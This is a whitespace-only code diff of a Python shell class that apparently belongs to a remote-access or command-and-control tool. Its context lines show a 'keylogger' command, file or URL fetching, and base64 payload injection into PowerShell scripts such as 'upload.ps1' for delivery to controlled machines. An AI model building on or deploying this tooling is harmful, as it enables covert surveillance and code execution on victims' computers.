@@ -20,7 +20,7 @@ class Shell:
         self.cli = cli
         self.db = db
         self.init_cmds()
-        
+
     def init_cmds(self):
         self.cmds = {}
         self.cmds['help'] = self.help
@@ -37,23 +37,23 @@ class Shell:
         self.cmds['keylogger'] = self.keylogger
         self.cmds['exit'] = None
         self.alias = Alias()
-        
+
     def get_cmd(self):
         return self.cmds
-        
+
     def flush_output(self):
         self.output = ""
-        
+
     def evalute_cmd(self, cmd):
         full_cmd = cmd
         self.flush_output()
-        
+
         self.data = cmd
         cmd = self.data.split(' ', 1)[0].lower()
-        
+
         if cmd not in self.cmds:
             return ("", full_cmd)
-        
+
         callback = self.cmds[cmd]
 
         if not callback == None:
@@ -68,7 +68,7 @@ class Shell:
             return ""
         else:
             return "[*] %s\n" % message
-        
+
     def help(self):
         self.output = '''Help Menu\n''' + '=' * 9 + \
         '\n' + tabulate({'_Commands': [
@@ -117,19 +117,19 @@ class Shell:
             'show this help menu',
             ]},
             headers="keys", tablefmt="simple")
-        
+
         self.output += self.alias.list_alias()
         self.output += self.alias.list_custom_alias()
         return ""
-    
 
-    def fetch(self): 
+
+    def fetch(self):
         try:
             (cmd, path, ps) = self.data.split(" ", 2)
         except:
             self.output += self.output_cli_or_str("Missing arguments")
             return ""
-        
+
         data = ""
         path = self.alias.get_alias(path)
         if Utils.file_exists(path, False, False):
@@ -169,7 +169,7 @@ class Shell:
         except:
             self.output += self.output_cli_or_str("Missing arguments")
             return ""
-        
+
         data = ""
         path = self.alias.get_alias(path)
         if Utils.file_exists(path, False, False):
@@ -179,7 +179,7 @@ class Shell:
 
         if not data == "":
             self.output += self.output_cli_or_str("Fetching %s" % path)
-            
+
             data = base64.b64encode(data)
             ps = Utils.load_powershell_script("upload.ps1", 3)
             ps = Utils.update_key(ps, "PAYLOAD", data)
@@ -196,14 +196,14 @@ class Shell:
         except:
             self.output += self.output_cli_or_str("Missing arguments")
             return ""
-        
+
         data = ""
         path = self.alias.get_alias(path)
         if Utils.file_exists(path, False, False):
             data = Utils.load_file_unsafe(path)
         else:
             data = Utils.download_url(path)
-            
+
         if not data == "":
             self.output += self.output_cli_or_str("Fetching %s" % path)
             data = base64.b64encode(data)
@@ -243,7 +243,7 @@ class Shell:
         except:
             self.output += self.output_cli_or_str("Missing arguments")
             return ""
-        
+
         self.alias.set_custom(key, value)
         self.output += self.output_cli_or_str("%s is now set to %s" % (key, value))
         return ""
